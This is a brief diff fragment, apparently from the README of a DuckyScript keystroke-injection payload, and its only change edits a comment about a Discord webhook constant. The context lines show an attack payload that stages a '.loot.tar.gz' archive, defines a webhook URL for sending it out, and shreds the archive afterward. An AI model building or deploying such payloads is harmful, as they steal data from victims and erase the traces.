@@ -76,7 +76,7 @@ shred -fuz ~/.loot.tar.gz
 
 **DuckyScript Payload (building of above script):**
 ```
-REM Place Discord webhook and user constants:
+REM Place Discord webhook constant:
 DEFINE #WEBHOOK_URL https://discord.com/api/webhooks/PLACE/WEBHOOK/HERE
 
 REM Begin attack:
